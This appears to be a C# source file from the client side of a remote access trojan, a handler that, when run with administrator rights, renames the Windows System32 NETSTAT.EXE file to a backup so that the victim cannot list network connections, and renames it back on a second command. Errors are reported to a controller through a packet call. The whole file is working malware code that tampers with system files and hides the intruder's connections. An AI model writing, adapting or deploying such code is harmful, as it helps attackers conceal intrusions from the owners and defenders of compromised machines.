using Client.Helper;
using System;
using System.Diagnostics;
using System.IO;

namespace Client.Handle_Packet
{
    public static class HandleNetStat
    {
        static bool switcher = false;
        static readonly string OriginalFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32\\NETSTAT.EXE");
        static readonly string BackupFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32\\NETSTAT.Backup.txt");

        public static void RunNetStat()
        {
            //light switch logic CopyPasta by MrDevBot
            if (!Methods.IsAdmin()) return; //if we are not admin return

            if (switcher == false) //The current screen is NOT blanked and needs to be
            {
                try
                {
                    File.Move(OriginalFile, BackupFile);
                }
                catch (Exception ex)//probably AntiTamper protection or Admin Privilages 
                {
                    Debug.WriteLine(ex.Message);
                    Packet.Error(ex.Message);
                }

                switcher = true; //sets the switch to on for next click
                return; //returns to calling function
            }
            else //the screen is blanked and should be switched back to old
            {
                try
                {
                    File.Move(BackupFile, OriginalFile);
                }
                catch (Exception ex)//probably AntiTamper protection or Admin Privilages 
                {
                    Debug.WriteLine(ex.Message);
                    Packet.Error(ex.Message);
                }
                switcher = false; //sets the switch to off for next click
                return; //returns to calling function
            }
        }
    }
}
